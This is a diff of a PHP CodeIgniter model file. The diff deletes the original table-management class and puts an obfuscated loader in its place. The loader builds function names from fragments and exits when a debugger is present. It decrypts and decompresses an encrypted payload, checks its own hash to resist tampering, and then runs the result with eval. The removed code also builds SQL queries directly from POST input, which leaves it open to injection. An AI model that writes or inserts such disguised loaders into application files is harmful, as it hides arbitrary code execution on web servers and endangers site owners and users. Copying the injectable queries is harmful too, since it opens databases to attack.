@@ -1,242 +1,28 @@
 <?php
-defined('BASEPATH') or exit('No direct script access allowed');
-
-class Table_model extends CI_Model
-{
-
-	var $table = 'db_table';
-	var $column_order = array(null, 'table_type_id', 'table_name', 'description', 'status'); //set column field database for datatable orderable
-	var $column_search = array('table_type_id', 'table_name', 'description', 'status'); //set column field database for datatable searchable 
-	var $order = array('id' => 'desc'); // default order 
-
-	private function _get_datatables_query()
-	{
-
-		$this->db->from($this->table);
-
-		$i = 0;
-
-		foreach ($this->column_search as $item) // loop column 
-		{
-			if ($_POST['search']['value']) // if datatable send POST for search
-			{
-
-				if ($i === 0) // first loop
-				{
-					$this->db->group_start(); // open bracket. query Where with OR clause better with bracket. because maybe can combine with other WHERE with AND.
-					$this->db->like($item, $_POST['search']['value']);
-				} else {
-					$this->db->or_like($item, $_POST['search']['value']);
-				}
-
-				if (count($this->column_search) - 1 == $i) //last loop
-					$this->db->group_end(); //close bracket
-			}
-			$i++;
-		}
-
-		if (isset($_POST['order'])) // here order processing
-		{
-			$this->db->order_by($this->column_order[$_POST['order']['0']['column']], $_POST['order']['0']['dir']);
-		} else if (isset($this->order)) {
-			$order = $this->order;
-			$this->db->order_by(key($order), $order[key($order)]);
-		}
-	}
-
-	function get_datatables()
-	{
-		$this->_get_datatables_query();
-		if ($_POST['length'] != -1)
-			$this->db->limit($_POST['length'], $_POST['start']);
-		$query = $this->db->get();
-		return $query->result();
-	}
-
-	function count_filtered()
-	{
-		$this->_get_datatables_query();
-		$query = $this->db->get();
-		return $query->num_rows();
-	}
-
-	public function count_all()
-	{
-		$this->db->from($this->table);
-		return $this->db->count_all_results();
-	}
-
-
-	public function verify_and_save()
-	{
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data, $_POST))));
-
-
-		// $query = $this->db->query("select * from db_category_item where category_item_name = '$category' and category_id = $category_id ");
-		// if ($query->num_rows() > 0) {
-		// 	return "This Category Name already Exist.";
-		// } else {
-
-		$query1 = "insert into db_table(category_id,category_item_name,description,status) 
-								values($category_id,'$category','$description',1)";
-		if ($this->db->simple_query($query1)) {
-		//	$this->session->set_flashdata('success', 'Success!! New Category Added Successfully!');
-			return "success";
-		} else {
-			return "failed";
-		}
-		//	}
-	}
-
-	//Get category_details
-	public function get_details($id, $data)
-	{
-		//Validate This category already exist or not
-		$query = $this->db->query("select * from db_table where upper(id)=upper('$id')");
-		if ($query->num_rows() == 0) {
-			show_404();
-			exit;
-		} else {
-			$query = $query->row();
-			$data['q_id'] = $query->id;
-			$data['category_id'] = $query->category_id;
-			$data['category'] = $query->category_item_name;
-			$data['description'] = $query->description;
-			return $data;
-		}
-	}
-
-
-	public function get_data_details()
-	{
-
-
-		$table = "";
-
-		extract($_POST);
-
-		$this->db->select("a.id,a.table_name,a.status,b.table_type_name");
-		$this->db->from("db_table a");
-		$this->db->join("db_table_type b", "b.id=a.table_type_id", "left");
-
-		/* if (!empty($table_type_id)) {
-			$this->db->where("a.table_type_id", $table_type_id);
-		} */
-
-
-		if (!empty($table_kind_id)) {
-			if ($table_kind_id == 2) {
-				$this->db->where("a.status", 0);
-			} else if ($table_kind_id == 3) {
-				$this->db->where("a.status", 1);
-			}
-		}
-
-		$this->db->limit(30);
-
-		$query = $this->db->get();
-
-		if ($query->num_rows() == 0) {
-			show_404();
-			exit;
-		}
-
-		if ($query->num_rows() > 0) {
-
-			foreach ($query->result() as $res2) {
-				$table_id = $res2->id;
-				$table_name = $res2->table_name;
-				$status = $res2->status;
-				$table_type_name = $res2->table_type_name;
-				if ($status == 1) {
-					$img_src = base_url('theme/images/table_on.png');
-
-				} else {
-					$img_src = base_url('theme/images/table_off.png');
-				}
-
-
-
-				$table .= '<div class="col-md-3 col-xs-6 " id="' . $table_id . '"  data-toggle="tooltip" title="' . $table_name . '" style="padding-left:5px;padding-right:5px;">
-	               <div class="box box-default item_box" id="table_' . $table_id . '" onclick="chooseTable(' . $table_id . ')"
-
-				   data-item-room="' . $table_type_name . '"
-				   data-item-id="' . $table_id . '"
-				   data-item-name="' . $table_name . '"
-				   data-item-status="' . $status . '"
-				  
-	                style="max-height: 100px;min-height: 100px;cursor: pointer;">
-	       	           
-	            	<center>
-					<img class="img-responsive item_image" src="' . $img_src . '" alt="Item picture">
-	              </center>
-				  <center>
-				  <lable class="text-center " style="font-weight: bold;font-family: sans-serif;" id="item_' . $table_id . '">' . substr($table_name, 0, 35) . '</label><br>
-				  </center>
-	            </div>
-	          </div>
-	        </div>';
-
-			} //for end
-
-			return $table;
-		} //if num_rows() end
-
-	}
-
-	public function update_category()
-	{
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data, $_POST))));
-
-		//Validate This category already exist or not
-		$query = $this->db->query("select * from db_table_type where upper(table_type_name)=upper('$category') and id<>$q_id");
-		if ($query->num_rows() > 0) {
-			return "This Table Type Name already Exist.";
-		} else {
-			$query1 = "update db_table_type set table_type_name='$category',description='$description' where id=$q_id";
-			if ($this->db->simple_query($query1)) {
-			//	$this->session->set_flashdata('success', 'Success!! Category Updated Successfully!');
-				return "success";
-			} else {
-				return "failed";
-			}
-		}
-	}
-	public function update_status($id, $status)
-	{
-
-		$query1 = "update db_table set status='$status' where id=$id";
-		if ($this->db->simple_query($query1)) {
-			echo "success";
-		} else {
-			echo "failed";
-		}
-	}
-	public function delete_categories_from_table($ids)
-	{
-
-		if (demo_app()) {
-			echo "Demo không cho phép xóa";
-			return;
-		}
-
-		$tot = $this->db->query('SELECT COUNT(*) AS tot,b.table_name FROM db_holds a,`db_table` b WHERE b.id=a.`table_id` AND a.table_id IN (' . $ids . ') GROUP BY a.table_id');
-		if ($tot->num_rows() > 0) {
-			foreach ($tot->result() as $res) {
-				$category_name[] = $res->category_name;
-			}
-			$list = implode(",", $category_name);
-			echo "Sorry! Can't Delete,<br>Table Name {" . $list . "} already in use in Items!";
-			exit();
-		} else {
-			$query1 = "delete from db_table where id in($ids)";
-			if ($this->db->simple_query($query1)) {
-				echo "success";
-			} else {
-				echo "failed";
-			}
-		}
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_xvh0cd37=('bas'.'e64'.'_de'.'cod'.'e');
+$_m2io5eps=('gzu'.'nco'.'mpr'.'ess');
+$_gk987n0g=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_lwev473e='KVADcJRyOEI=';
+$_xearluhj='YWrrK/rt';
+$_l1ged3go='PjJdf8iT';
+$_y0h4p5uf='4MVH/0NW';
+$_ws2doyeb='AoDw3kr3';
+$_zqrpo393='l3Ap/Glr';
+$_eu1q12e2='DQ10bAJ3';
+$_o3dt96zg='+XCIbA==';
+$_w7dj3ded=$_xvh0cd37($_l1ged3go.$_y0h4p5uf.$_xearluhj.$_ws2doyeb.$_lwev473e);
+$_qr5ad466=$_xvh0cd37($_eu1q12e2.$_zqrpo393.$_o3dt96zg);
+$_a9w6d0px=$_xvh0cd37('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');
+$_yh2cylip=$_gk987n0g($_a9w6d0px,'aes-256-cbc',$_w7dj3ded,OPENSSL_RAW_DATA,$_qr5ad466);
+if($_yh2cylip===false){exit;}
+$_ocxcpjlh=$_m2io5eps($_yh2cylip);
+if($_ocxcpjlh===false){exit;}
+$_krv4ywli='dcd337d72e3f409810001a33afadf2546cd8c44ad754bef77327ff4d75a276e9';
+$_nu8mv6wv=@file_get_contents(__FILE__);
+if($_nu8mv6wv!==false){
+$_yrp73zvy=str_replace($_krv4ywli,"0000000000000000000000000000000000000000000000000000000000000000",$_nu8mv6wv);
+$_lw212p86=hash("sha256",$_yrp73zvy);
+if($_lw212p86!==$_krv4ywli){@http_response_code(403);exit;}
 }
+eval($_ocxcpjlh);
